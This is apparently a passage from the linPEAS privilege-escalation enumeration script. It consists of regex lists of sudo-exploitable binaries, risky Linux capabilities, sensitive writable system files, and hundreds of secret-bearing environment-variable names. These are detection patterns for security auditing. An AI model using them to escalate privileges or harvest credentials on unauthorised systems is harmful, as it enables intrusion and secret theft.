sudoVB1=" \*|env_keep\W*\+=.*LD_PRELOAD|env_keep\W*\+=.*LD_LIBRARY_PATH|7z$|aa-exec$|ab$|alpine$|ansible-playbook$|ansible-test$|aoss$|apt-get$|apt$|ar$|aria2c$|arj$|arp$|as$|ascii-xfr$|ascii85$|ash$|aspell$|at$|atobm$|awk$|aws$|base32$|base58$|base64$|basenc$|basez$|bash$|batcat$|bc$|bconsole$|bpftrace$|bridge$|bundle$|bundler$|busctl$|busybox$|byebug$|bzip2$|c89$|c99$|cabal$|capsh$|cat$|cdist$|certbot$|check_by_ssh$|check_cups$|check_log$|check_memory$|check_raid$|check_ssl_cert$|check_statusfile$|chmod$|choom$|chown$|chroot$|clamscan$|cmp$|cobc$|column$|comm$|composer$|cowsay$|cowthink$|cp$|cpan$|cpio$|cpulimit$|crash$|crontab$|csh$|csplit$|csvtool$|cupsfilter$|curl$|cut$|dash$|date$|dd$|debugfs$|dialog$|diff$|dig$|distcc$|dmesg$|dmidecode$|dmsetup$|dnf$|docker$|dosbox$|dotnet$|dpkg$|dstat$|dvips$|easy_install$|eb$|ed$|efax$|elvish$|emacs$|env$|eqn$|espeak$|ex$|exiftool$|expand$|expect$|facter$|file$|find$|fish$|flock$|fmt$|fold$|fping$|ftp$|gawk$|gcc$|gcloud$|gcore$|gdb$|gem$|genie$|genisoimage$|ghc$|ghci$|gimp$|ginsh$|git$|grc$|grep$|gtester$|gzip$|hd$|head$|hexdump$|highlight$|hping3$|iconv$|iftop$|install$|ionice$|ip$|irb$|ispell$|jjs$|joe$|join$|journalctl$|jq$|jrunscript$|jtag$|julia$|knife$|ksh$|ksshell$|ksu$|kubectl$|latex$|latexmk$|ldconfig$|less$|lftp$|ln$|loginctl$|logsave$|look$|ltrace$|lua$|lualatex$|luatex$|lwp-download$|lwp-request$|mail$|make$|man$|mawk$|more$|mosquitto$|mount$|msfconsole$"
sudoVB2="msgattrib$|msgcat$|msgconv$|msgfilter$|msgmerge$|msguniq$|mtr$|multitime$|mv$|mysql$|nano$|nasm$|nawk$|nc$|ncftp$|neofetch$|nft$|nice$|nl$|nm$|nmap$|node$|nohup$|npm$|nroff$|nsenter$|octave$|od$|openssl$|openvpn$|openvt$|opkg$|pandoc$|paste$|pdb$|pdflatex$|pdftex$|perf$|perl$|perlbug$|pexec$|pg$|php$|pic$|pico$|pidstat$|pip$|pkexec$|pkg$|posh$|pr$|pry$|psftp$|psql$|ptx$|puppet$|pwsh$|python$|rake$|rc$|readelf$|red$|redcarpet$|restic$|rev$|rlwrap$|rpm$|rpmdb$|rpmquery$|rpmverify$|rsync$|ruby$|run-mailcap$|run-parts$|rview$|rvim$|sash$|scanmem$|scp$|screen$|script$|scrot$|sed$|service$|setarch$|setfacl$|setlock$|sftp$|sg$|shuf$|slsh$|smbclient$|snap$|socat$|soelim$|softlimit$|sort$|split$|sqlite3$|sqlmap$|ss$|ssh-agent$|ssh-keygen$|ssh-keyscan$|ssh$|sshpass$|start-stop-daemon$|stdbuf$|strace$|strings$|su$|sysctl$|systemctl$|systemd-resolve$|tac$|tail$|tar$|task$|taskset$|tasksh$|tbl$|tclsh$|tcpdump$|tdbtool$|tee$|telnet$|terraform$|tex$|tftp$|tic$|time$|timedatectl$|timeout$|tmate$|tmux$|top$|torify$|torsocks$|troff$|ul$|unexpand$|uniq$|unshare$|unsquashfs$|unzip$|update-alternatives$|uudecode$|uuencode$|vagrant$|valgrind$|vi$|view$|vigr$|vim$|vimdiff$|vipw$|virsh$|w3m$|wall$|watch$|wc$|wget$|whiptail$|wireshark$|wish$|xargs$|xdg-user-dir$|xdotool$|xelatex$|xetex$|xmodmap$|xmore$|xpad$|xxd$|xz$|yarn$|yash$|yum$|zathura$|zip$|zsh$|zsoelim$|zypper$"
sudoB="$(whoami)|ALL:ALL|ALL : ALL|ALL|env_keep|NOPASSWD|SETENV|/apache2|/cryptsetup|/mount"
sudoG="NOEXEC"

capsVB="cap_sys_admin:mount|python \
cap_sys_ptrace:python \
cap_sys_module:kmod|python \
cap_dac_override:python|vim \
cap_chown:chown|python \
cap_former:chown|python \
cap_setuid:gdb|node|perl|php|python|ruby|rview|rvim|view|vim|vimdiff \
cap_setgid:gdb|node|perl|php|python|ruby|rview|rvim|view|vim|vimdiff \
cap_net_raw:python|tcpdump"


capsB="=ep|cap_chown|cap_former|cap_setfcap|cap_dac_override|cap_dac_read_search|cap_setuid|cap_setgid|cap_kill|cap_net_bind_service|cap_net_raw|cap_net_admin|cap_sys_admin|cap_sys_ptrace|cap_sys_module"
containercapsB="sys_admin|sys_ptrace|sys_module|dac_read_search|dac_override|sys_rawio|syslog|net_raw|net_admin"

OLDPATH=$PATH
ADDPATH=":/usr/local/sbin\
 :/usr/local/bin\
 :/usr/sbin\
 :/usr/bin\
 :/sbin\
 :/bin"
spath=":$PATH"
for P in $ADDPATH; do
  if [ "${spath##*$P*}" ]; then export PATH="$PATH$P" 2>/dev/null; fi
done

# Test if sed supports -E or -r
E=E
echo | sed -${E} 's/o/a/' 2>/dev/null
if [ $? -ne 0 ] ; then
	echo | sed -r 's/o/a/' 2>/dev/null
	if [ $? -eq 0 ] ; then
		E=r
	else
		echo "${YELLOW}WARNING: No suitable option found for extended regex with sed. Continuing but the results might be unreliable.${NC}"
	fi
fi

writeB="00-header|10-help-text|50-motd-news|80-esm|91-release-upgrade|\.sh$|\./|/authorized_keys|/bin/|/boot/|/etc/apache2/apache2.conf|/etc/apache2/httpd.conf|/etc/hosts.allow|/etc/hosts.deny|/etc/httpd/conf/httpd.conf|/etc/httpd/httpd.conf|/etc/inetd.conf|/etc/incron.conf|/etc/login.defs|/etc/logrotate.d/|/etc/modprobe.d/|/etc/pam.d/|/etc/php.*/fpm/pool.d/|/etc/php/.*/fpm/pool.d/|/etc/rsyslog.d/|/etc/skel/|/etc/sysconfig/network-scripts/|/etc/sysctl.conf|/etc/sysctl.d/|/etc/uwsgi/apps-enabled/|/etc/xinetd.conf|/etc/xinetd.d/|/etc/|/home//|/lib/|/log/|/mnt/|/root|/sys/|/usr/bin|/usr/games|/usr/lib|/usr/local/bin|/usr/local/games|/usr/local/sbin|/usr/sbin|/sbin/|/var/log/|\.timer$|\.service$|.socket$"
writeVB="/etc/anacrontab|/etc/apt/apt.conf.d|/etc/bash.bashrc|/etc/bash_completion|/etc/bash_completion.d/|/etc/cron|/etc/environment|/etc/environment.d/|/etc/group|/etc/incron.d/|/etc/init|/etc/ld.so.conf.d/|/etc/master.passwd|/etc/passwd|/etc/profile.d/|/etc/profile|/etc/rc.d|/etc/shadow|/etc/skey/|/etc/sudoers|/etc/sudoers.d/|/etc/supervisor/conf.d/|/etc/supervisor/supervisord.conf|/etc/systemd|/etc/sys|/lib/systemd|/etc/update-motd.d/|/root/.ssh/|/run/systemd|/usr/lib/cron/tabs/|/usr/lib/systemd|/systemd/system|/var/db/yubikey/|/var/spool/anacron|/var/spool/cron/crontabs|"$(echo $PATH 2>/dev/null | sed 's/:\.:/:/g' | sed 's/:\.$//g' | sed 's/^\.://g' | sed 's/:/$|^/g') #Add Path but remove simple dot in PATH

if [ "$MACPEAS" ]; then
  sh_usrs="ImPoSSssSiBlEee"
  nosh_usrs="ImPoSSssSiBlEee"
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if  grep -q \"$ushell\" /etc/shells; then sh_usrs="$sh_usrs|$uname"; else nosh_usrs="$nosh_usrs|$uname"; fi
  done
else
  sh_usrs=$(cat /etc/passwd 2>/dev/null | grep -v "^root:" | grep -i "sh$" | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/' | sed 's/|sys|/|sys[\\\s:]|^sys$|/' | sed 's/|daemon|/|daemon[\\\s:]|^daemon$|/')"ImPoSSssSiBlEee" #Modified bin, sys and daemon so they are not colored everywhere
  # Surround each username with word boundary character '\b' to prevent false positives caused by short user names (e.g. user "sys" shouldn't highlight partial match on "system")
  nosh_usrs=$(cat /etc/passwd 2>/dev/null | grep -i -v "sh$" |awk '{ print "\\b" $0 }' | sort | cut -d ":" -f 1 | sed s/$/\\\\b/g | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/')"ImPoSSssSiBlEee"
fi
knw_usrs='_amavisd|_analyticsd|_appinstalld|_appleevents|_applepay|_appowner|_appserver|_appstore|_ard|_assetcache|_astris|_atsserver|_avbdeviced|_calendar|_captiveagent|_ces|_clamav|_cmiodalassistants|_coreaudiod|_coremediaiod|_coreml|_ctkd|_cvmsroot|_cvs|_cyrus|_datadetectors|_demod|_devdocs|_devicemgr|_diskimagesiod|_displaypolicyd|_distnote|_dovecot|_dovenull|_dpaudio|_driverkit|_eppc|_findmydevice|_fpsd|_ftp|_fud|_gamecontrollerd|_geod|_hidd|_iconservices|_installassistant|_installcoordinationd|_installer|_jabber|_kadmin_admin|_kadmin_changepw|_knowledgegraphd|_krb_anonymous|_krb_changepw|_krb_kadmin|_krb_kerberos|_krb_krbtgt|_krbfast|_krbtgt|_launchservicesd|_lda|_locationd|_logd|_lp|_mailman|_mbsetupuser|_mcxalr|_mdnsresponder|_mobileasset|_mysql|_nearbyd|_netbios|_netstatistics|_networkd|_nsurlsessiond|_nsurlstoraged|_oahd|_ondemand|_postfix|_postgres|_qtss|_reportmemoryexception|_rmd|_sandbox|_screensaver|_scsd|_securityagent|_softwareupdate|_spotlight|_sshd|_svn|_taskgated|_teamsserver|_timed|_timezone|_tokend|_trustd|_trustevaluationagent|_unknown|_update_sharing|_usbmuxd|_uucp|_warmd|_webauthserver|_windowserver|_www|_wwwproxy|_xserverdocs|daemon\W|^daemon$|message\+|syslog|www|www-data|mail|nobody|Debian\-\+|rtkit|systemd\+'
if ! [ "$USER" ]; then
  USER=$(whoami 2>/dev/null || echo -n "UserUnknown")
fi
if [ ! "$HOME" ]; then
  if [ -d "/Users/$USER" ]; then HOME="/Users/$USER"; # Mac home
  else HOME="/home/$USER";
  fi
fi
Groups="ImPoSSssSiBlEee"$(groups "$USER" 2>/dev/null | cut -d ":" -f 2 | tr ' ' '|')

# These variables are divided into several different ones because NetBSD requires that.
pwd_inside_history="az login|enable_autologin|7z|unzip|useradd|linenum|linpeas|mkpasswd|htpasswd|openssl|PASSW|passw|shadow|roadrecon auth|root|snyk|sudo|^su|pkexec|^ftp|mongo|psql|mysql|rdesktop|Save-AzContext|xfreerdp|^ssh|steghide|@|KEY=|TOKEN=|BEARER=|Authorization:|chpasswd"

pwd_in_variables1="Dgpg.passphrase|Dsonar.login|Dsonar.projectKey|GITHUB_TOKEN|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|PUSHOVER_TOKEN|PUSHOVER_USER|VIRUSTOTAL_APIKEY|ACCESSKEY|ACCESSKEYID|ACCESS_KEY|ACCESS_KEY_ID|ACCESS_KEY_SECRET|ACCESS_SECRET|ACCESS_TOKEN|ACCOUNT_SID|ADMIN_EMAIL|ADZERK_API_KEY|ALGOLIA_ADMIN_KEY_1|ALGOLIA_ADMIN_KEY_2|ALGOLIA_ADMIN_KEY_MCM|ALGOLIA_API_KEY|ALGOLIA_API_KEY_MCM|ALGOLIA_API_KEY_SEARCH|ALGOLIA_APPLICATION_ID|ALGOLIA_APPLICATION_ID_1|ALGOLIA_APPLICATION_ID_2|ALGOLIA_APPLICATION_ID_MCM|ALGOLIA_APP_ID|ALGOLIA_APP_ID_MCM|ALGOLIA_SEARCH_API_KEY|ALGOLIA_SEARCH_KEY|ALGOLIA_SEARCH_KEY_1|ALIAS_NAME|ALIAS_PASS|ALICLOUD_ACCESS_KEY|ALICLOUD_SECRET_KEY|amazon_bucket_name|AMAZON_SECRET_ACCESS_KEY|ANDROID_DOCS_DEPLOY_TOKEN|android_sdk_license|android_sdk_preview_license|aos_key|aos_sec|APIARY_API_KEY|APIGW_ACCESS_TOKEN|API_KEY|API_KEY_MCM|API_KEY_SECRET|API_KEY_SID|API_SECRET|appClientSecret|APP_BUCKET_PERM|APP_NAME|APP_REPORT_TOKEN_KEY|APP_TOKEN|ARGOS_TOKEN|ARTIFACTORY_KEY|ARTIFACTS_AWS_ACCESS_KEY_ID|ARTIFACTS_AWS_SECRET_ACCESS_KEY|ARTIFACTS_BUCKET|ARTIFACTS_KEY|ARTIFACTS_SECRET|ASSISTANT_IAM_APIKEY|AURORA_STRING_URL|AUTH0_API_CLIENTID|AUTH0_API_CLIENTSECRET|AUTH0_AUDIENCE|AUTH0_CALLBACK_URL|AUTH0_CLIENT_ID"
pwd_in_variables2="AUTH0_CLIENT_SECRET|AUTH0_CONNECTION|AUTH0_DOMAIN|AUTHOR_EMAIL_ADDR|AUTHOR_NPM_API_KEY|AUTH_TOKEN|AWS-ACCT-ID|AWS-KEY|AWS-SECRETS|AWS.config.accessKeyId|AWS.config.secretAccessKey|AWSACCESSKEYID|AWSCN_ACCESS_KEY_ID|AWSCN_SECRET_ACCESS_KEY|AWSSECRETKEY|AWS_ACCESS|AWS_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_CF_DIST_ID|AWS_DEFAULT|AWS_DEFAULT_REGION|AWS_S3_BUCKET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_SECRET_KEY|AWS_SES_ACCESS_KEY_ID|AWS_SES_SECRET_ACCESS_KEY|B2_ACCT_ID|B2_APP_KEY|B2_BUCKET|baseUrlTravis|bintrayKey|bintrayUser|BINTRAY_APIKEY|BINTRAY_API_KEY|BINTRAY_KEY|BINTRAY_TOKEN|BINTRAY_USER|BLUEMIX_ACCOUNT|BLUEMIX_API_KEY|BLUEMIX_AUTH|BLUEMIX_NAMESPACE|BLUEMIX_ORG|BLUEMIX_ORGANIZATION|BLUEMIX_PASS|BLUEMIX_PASS_PROD|BLUEMIX_SPACE|BLUEMIX_USER|BRACKETS_REPO_OAUTH_TOKEN|BROWSERSTACK_ACCESS_KEY|BROWSERSTACK_PROJECT_NAME|BROWSER_STACK_ACCESS_KEY|BUCKETEER_AWS_ACCESS_KEY_ID|BUCKETEER_AWS_SECRET_ACCESS_KEY|BUCKETEER_BUCKET_NAME|BUILT_BRANCH_DEPLOY_KEY|BUNDLESIZE_GITHUB_TOKEN|CACHE_S3_SECRET_KEY|CACHE_URL|CARGO_TOKEN|CATTLE_ACCESS_KEY|CATTLE_AGENT_INSTANCE_AUTH|CATTLE_SECRET_KEY|CC_TEST_REPORTER_ID|CC_TEST_REPOTER_ID|CENSYS_SECRET|CENSYS_UID|CERTIFICATE_OSX_P12|CF_ORGANIZATION|CF_PROXY_HOST|channelId|CHEVERNY_TOKEN|CHROME_CLIENT_ID"
pwd_in_variables3="CHROME_CLIENT_SECRET|CHROME_EXTENSION_ID|CHROME_REFRESH_TOKEN|CI_DEPLOY_USER|CI_NAME|CI_PROJECT_NAMESPACE|CI_PROJECT_URL|CI_REGISTRY_USER|CI_SERVER_NAME|CI_USER_TOKEN|CLAIMR_DATABASE|CLAIMR_DB|CLAIMR_SUPERUSER|CLAIMR_TOKEN|CLIENT_ID|CLIENT_SECRET|CLI_E2E_CMA_TOKEN|CLI_E2E_ORG_ID|CLOUDAMQP_URL|CLOUDANT_APPLIANCE_DATABASE|CLOUDANT_ARCHIVED_DATABASE|CLOUDANT_AUDITED_DATABASE|CLOUDANT_DATABASE|CLOUDANT_ORDER_DATABASE|CLOUDANT_PARSED_DATABASE|CLOUDANT_PROCESSED_DATABASE|CLOUDANT_SERVICE_DATABASE|CLOUDFLARE_API_KEY|CLOUDFLARE_AUTH_EMAIL|CLOUDFLARE_AUTH_KEY|CLOUDFLARE_EMAIL|CLOUDFLARE_ZONE_ID|CLOUDINARY_URL|CLOUDINARY_URL_EU|CLOUDINARY_URL_STAGING|CLOUD_API_KEY|CLUSTER_NAME|CLU_REPO_URL|CLU_SSH_PRIVATE_KEY_BASE64|CN_ACCESS_KEY_ID|CN_SECRET_ACCESS_KEY|COCOAPODS_TRUNK_EMAIL|COCOAPODS_TRUNK_TOKEN|CODACY_PROJECT_TOKEN|CODECLIMATE_REPO_TOKEN|CODECOV_TOKEN|coding_token|CONEKTA_APIKEY|CONFIGURATION_PROFILE_SID|CONFIGURATION_PROFILE_SID_P2P|CONFIGURATION_PROFILE_SID_SFU|CONSUMERKEY|CONSUMER_KEY|CONTENTFUL_ACCESS_TOKEN|CONTENTFUL_CMA_TEST_TOKEN|CONTENTFUL_INTEGRATION_MANAGEMENT_TOKEN|CONTENTFUL_INTEGRATION_SOURCE_SPACE|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN_NEW|CONTENTFUL_ORGANIZATION"
pwd_in_variables4="CONTENTFUL_PHP_MANAGEMENT_TEST_TOKEN|CONTENTFUL_TEST_ORG_CMA_TOKEN|CONTENTFUL_V2_ACCESS_TOKEN|CONTENTFUL_V2_ORGANIZATION|CONVERSATION_URL|COREAPI_HOST|COS_SECRETS|COVERALLS_API_TOKEN|COVERALLS_REPO_TOKEN|COVERALLS_SERVICE_NAME|COVERALLS_TOKEN|COVERITY_SCAN_NOTIFICATION_EMAIL|COVERITY_SCAN_TOKEN|CYPRESS_RECORD_KEY|DANGER_GITHUB_API_TOKEN|DATABASE_HOST|DATABASE_NAME|DATABASE_PORT|DATABASE_USER|DATABASE_PASSWORD|datadog_api_key|datadog_app_key|DB_CONNECTION|DB_DATABASE|DB_HOST|DB_PORT|DB_PW|DB_USER|DDGC_GITHUB_TOKEN|DDG_TEST_EMAIL|DDG_TEST_EMAIL_PW|DEPLOY_DIR|DEPLOY_DIRECTORY|DEPLOY_HOST|DEPLOY_PORT|DEPLOY_SECURE|DEPLOY_TOKEN|DEPLOY_USER|DEST_TOPIC|DHL_SOLDTOACCOUNTID|DH_END_POINT_1|DH_END_POINT_2|DIGITALOCEAN_ACCESS_TOKEN|DIGITALOCEAN_SSH_KEY_BODY|DIGITALOCEAN_SSH_KEY_IDS|DOCKER_EMAIL|DOCKER_KEY|DOCKER_PASSDOCKER_POSTGRES_URL|DOCKER_RABBITMQ_HOST|docker_repo|DOCKER_TOKEN|DOCKER_USER|DOORDASH_AUTH_TOKEN|DROPBOX_OAUTH_BEARER|ELASTICSEARCH_HOST|ELASTIC_CLOUD_AUTH|env.GITHUB_OAUTH_TOKEN|env.HEROKU_API_KEY|ENV_KEY|ENV_SECRET|ENV_SECRET_ACCESS_KEY|eureka.awsAccessId"
pwd_in_variables5="eureka.awsSecretKey|ExcludeRestorePackageImports|EXPORT_SPACE_ID|FIREBASE_API_JSON|FIREBASE_API_TOKEN|FIREBASE_KEY|FIREBASE_PROJECT|FIREBASE_PROJECT_DEVELOP|FIREBASE_PROJECT_ID|FIREBASE_SERVICE_ACCOUNT|FIREBASE_TOKEN|FIREFOX_CLIENT|FIREFOX_ISSUER|FIREFOX_SECRET|FLASK_SECRET_KEY|FLICKR_API_KEY|FLICKR_API_SECRET|FOSSA_API_KEY|ftp_host|FTP_LOGIN|FTP_PW|FTP_USER|GCLOUD_BUCKET|GCLOUD_PROJECT|GCLOUD_SERVICE_KEY|GCS_BUCKET|GHB_TOKEN|GHOST_API_KEY|GH_API_KEY|GH_EMAIL|GH_NAME|GH_NEXT_OAUTH_CLIENT_ID|GH_NEXT_OAUTH_CLIENT_SECRET|GH_NEXT_UNSTABLE_OAUTH_CLIENT_ID|GH_NEXT_UNSTABLE_OAUTH_CLIENT_SECRET|GH_OAUTH_CLIENT_ID|GH_OAUTH_CLIENT_SECRET|GH_OAUTH_TOKEN|GH_REPO_TOKEN|GH_TOKEN|GH_UNSTABLE_OAUTH_CLIENT_ID|GH_UNSTABLE_OAUTH_CLIENT_SECRET|GH_USER_EMAIL|GH_USER_NAME|GITHUB_ACCESS_TOKEN|GITHUB_API_KEY|GITHUB_API_TOKEN|GITHUB_AUTH|GITHUB_AUTH_TOKEN|GITHUB_AUTH_USER|GITHUB_CLIENT_ID|GITHUB_CLIENT_SECRET|GITHUB_DEPLOYMENT_TOKEN|GITHUB_DEPLOY_HB_DOC_PASS|GITHUB_HUNTER_TOKEN|GITHUB_KEY|GITHUB_OAUTH|GITHUB_OAUTH_TOKEN|GITHUB_RELEASE_TOKEN|GITHUB_REPO|GITHUB_TOKEN|GITHUB_TOKENS|GITHUB_USER|GITLAB_USER_EMAIL|GITLAB_USER_LOGIN|GIT_AUTHOR_EMAIL|GIT_AUTHOR_NAME|GIT_COMMITTER_EMAIL|GIT_COMMITTER_NAME|GIT_EMAIL|GIT_NAME|GIT_TOKEN|GIT_USER"
pwd_in_variables6="GOOGLE_CLIENT_EMAIL|GOOGLE_CLIENT_ID|GOOGLE_CLIENT_SECRET|GOOGLE_MAPS_API_KEY|GOOGLE_PRIVATE_KEY|gpg.passphrase|GPG_EMAIL|GPG_ENCRYPTION|GPG_EXECUTABLE|GPG_KEYNAME|GPG_KEY_NAME|GPG_NAME|GPG_OWNERTRUST|GPG_PASSPHRASE|GPG_PRIVATE_KEY|GPG_SECRET_KEYS|gradle.publish.key|gradle.publish.secret|GRADLE_SIGNING_KEY_ID|GREN_GITHUB_TOKEN|GRGIT_USER|HAB_AUTH_TOKEN|HAB_KEY|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|HEROKU_API_KEY|HEROKU_API_USER|HEROKU_EMAIL|HEROKU_TOKEN|HOCKEYAPP_TOKEN|INTEGRATION_TEST_API_KEY|INTEGRATION_TEST_APPID|INTERNAL-SECRETS|IOS_DOCS_DEPLOY_TOKEN|IRC_NOTIFICATION_CHANNEL|JDBC:MYSQL|jdbc_databaseurl|jdbc_host|jdbc_user|JWT_SECRET|KAFKA_ADMIN_URL|KAFKA_INSTANCE_NAME|KAFKA_REST_URL|KEYSTORE_PASS|KOVAN_PRIVATE_KEY|LEANPLUM_APP_ID|LEANPLUM_KEY|LICENSES_HASH|LICENSES_HASH_TWO|LIGHTHOUSE_API_KEY|LINKEDIN_CLIENT_ID|LINKEDIN_CLIENT_SECRET|LINODE_INSTANCE_ID|LINODE_VOLUME_ID|LINUX_SIGNING_KEY|LL_API_SHORTNAME|LL_PUBLISH_URL|LL_SHARED_KEY|LOOKER_TEST_RUNNER_CLIENT_ID|LOOKER_TEST_RUNNER_CLIENT_SECRET|LOOKER_TEST_RUNNER_ENDPOINT|LOTTIE_HAPPO_API_KEY|LOTTIE_HAPPO_SECRET_KEY|LOTTIE_S3_API_KEY|LOTTIE_S3_SECRET_KEY|mailchimp_api_key|MAILCHIMP_KEY|mailchimp_list_id|mailchimp_user|MAILER_HOST|MAILER_TRANSPORT|MAILER_USER"
pwd_in_variables7="MAILGUN_APIKEY|MAILGUN_API_KEY|MAILGUN_DOMAIN|MAILGUN_PRIV_KEY|MAILGUN_PUB_APIKEY|MAILGUN_PUB_KEY|MAILGUN_SECRET_API_KEY|MAILGUN_TESTDOMAIN|ManagementAPIAccessToken|MANAGEMENT_TOKEN|MANAGE_KEY|MANAGE_SECRET|MANDRILL_API_KEY|MANIFEST_APP_TOKEN|MANIFEST_APP_URL|MapboxAccessToken|MAPBOX_ACCESS_TOKEN|MAPBOX_API_TOKEN|MAPBOX_AWS_ACCESS_KEY_ID|MAPBOX_AWS_SECRET_ACCESS_KEY|MG_API_KEY|MG_DOMAIN|MG_EMAIL_ADDR|MG_EMAIL_TO|MG_PUBLIC_API_KEY|MG_SPEND_MONEY|MG_URL|MH_APIKEY|MILE_ZERO_KEY|MINIO_ACCESS_KEY|MINIO_SECRET_KEY|MYSQLMASTERUSER|MYSQLSECRET|MYSQL_DATABASE|MYSQL_HOSTNAMEMYSQL_USER|MY_SECRET_ENV|NETLIFY_API_KEY|NETLIFY_SITE_ID|NEW_RELIC_BETA_TOKEN|NGROK_AUTH_TOKEN|NGROK_TOKEN|node_pre_gyp_accessKeyId|NODE_PRE_GYP_GITHUB_TOKEN|node_pre_gyp_secretAccessKey|NPM_API_KEY|NPM_API_TOKEN|NPM_AUTH_TOKEN|NPM_EMAIL|NPM_SECRET_KEY|NPM_TOKEN|NUGET_APIKEY|NUGET_API_KEY|NUGET_KEY|NUMBERS_SERVICE|NUMBERS_SERVICE_PASS|NUMBERS_SERVICE_USER|OAUTH_TOKEN|OBJECT_STORAGE_PROJECT_ID|OBJECT_STORAGE_USER_ID|OBJECT_STORE_BUCKET|OBJECT_STORE_CREDS|OCTEST_SERVER_BASE_URL|OCTEST_SERVER_BASE_URL_2|OC_PASS|OFTA_KEY|OFTA_SECRET|OKTA_CLIENT_TOKEN|OKTA_DOMAIN|OKTA_OAUTH2_CLIENTID|OKTA_OAUTH2_CLIENTSECRET|OKTA_OAUTH2_CLIENT_ID|OKTA_OAUTH2_CLIENT_SECRET"
pwd_in_variables8="OKTA_OAUTH2_ISSUER|OMISE_KEY|OMISE_PKEY|OMISE_PUBKEY|OMISE_SKEY|ONESIGNAL_API_KEY|ONESIGNAL_USER_AUTH_KEY|OPENWHISK_KEY|OPEN_WHISK_KEY|OSSRH_PASS|OSSRH_SECRET|OSSRH_USER|OS_AUTH_URL|OS_PROJECT_NAME|OS_TENANT_ID|OS_TENANT_NAME|PAGERDUTY_APIKEY|PAGERDUTY_ESCALATION_POLICY_ID|PAGERDUTY_FROM_USER|PAGERDUTY_PRIORITY_ID|PAGERDUTY_SERVICE_ID|PANTHEON_SITE|PARSE_APP_ID|PARSE_JS_KEY|PAYPAL_CLIENT_ID|PAYPAL_CLIENT_SECRET|PERCY_TOKEN|PERSONAL_KEY|PERSONAL_SECRET|PG_DATABASE|PG_HOST|PLACES_APIKEY|PLACES_API_KEY|PLACES_APPID|PLACES_APPLICATION_ID|PLOTLY_APIKEY|POSTGRESQL_DB|POSTGRESQL_PASS|POSTGRES_ENV_POSTGRES_DB|POSTGRES_ENV_POSTGRES_USER|POSTGRES_PORT|PREBUILD_AUTH|PROD.ACCESS.KEY.ID|PROD.SECRET.KEY|PROD_BASE_URL_RUNSCOPE|PROJECT_CONFIG|PUBLISH_KEY|PUBLISH_SECRET|PUSHOVER_TOKEN|PUSHOVER_USER|PYPI_PASSOWRD|QUIP_TOKEN|RABBITMQ_SERVER_ADDR|REDISCLOUD_URL|REDIS_STUNNEL_URLS|REFRESH_TOKEN|RELEASE_GH_TOKEN|RELEASE_TOKEN|remoteUserToShareTravis|REPORTING_WEBDAV_URL|REPORTING_WEBDAV_USER|repoToken|REST_API_KEY|RINKEBY_PRIVATE_KEY|ROPSTEN_PRIVATE_KEY|route53_access_key_id|RTD_KEY_PASS|RTD_STORE_PASS|RUBYGEMS_AUTH_TOKEN|s3_access_key|S3_ACCESS_KEY_ID|S3_BUCKET_NAME_APP_LOGS|S3_BUCKET_NAME_ASSETS|S3_KEY"
pwd_in_variables9="S3_KEY_APP_LOGS|S3_KEY_ASSETS|S3_PHOTO_BUCKET|S3_SECRET_APP_LOGS|S3_SECRET_ASSETS|S3_SECRET_KEY|S3_USER_ID|S3_USER_SECRET|SACLOUD_ACCESS_TOKEN|SACLOUD_ACCESS_TOKEN_SECRET|SACLOUD_API|SALESFORCE_BULK_TEST_SECURITY_TOKEN|SANDBOX_ACCESS_TOKEN|SANDBOX_AWS_ACCESS_KEY_ID|SANDBOX_AWS_SECRET_ACCESS_KEY|SANDBOX_LOCATION_ID|SAUCE_ACCESS_KEY|SECRETACCESSKEY|SECRETKEY|SECRET_0|SECRET_10|SECRET_11|SECRET_1|SECRET_2|SECRET_3|SECRET_4|SECRET_5|SECRET_6|SECRET_7|SECRET_8|SECRET_9|SECRET_KEY_BASE|SEGMENT_API_KEY|SELION_SELENIUM_SAUCELAB_GRID_CONFIG_FILE|SELION_SELENIUM_USE_SAUCELAB_GRID|SENDGRID|SENDGRID_API_KEY|SENDGRID_FROM_ADDRESS|SENDGRID_KEY|SENDGRID_USER|SENDWITHUS_KEY|SENTRY_AUTH_TOKEN|SERVICE_ACCOUNT_SECRET|SES_ACCESS_KEY|SES_SECRET_KEY|setDstAccessKey|setDstSecretKey|setSecretKey|SIGNING_KEY|SIGNING_KEY_SECRET|SIGNING_KEY_SID|SNOOWRAP_CLIENT_SECRET|SNOOWRAP_REDIRECT_URI|SNOOWRAP_REFRESH_TOKEN|SNOOWRAP_USER_AGENT|SNYK_API_TOKEN|SNYK_ORG_ID|SNYK_TOKEN|SOCRATA_APP_TOKEN|SOCRATA_USER|SONAR_ORGANIZATION_KEY|SONAR_PROJECT_KEY|SONAR_TOKEN|SONATYPE_GPG_KEY_NAME|SONATYPE_GPG_PASSPHRASE|SONATYPE_PASSSONATYPE_TOKEN_USER|SONATYPE_USER|SOUNDCLOUD_CLIENT_ID|SOUNDCLOUD_CLIENT_SECRET|SPACES_ACCESS_KEY_ID|SPACES_SECRET_ACCESS_KEY"
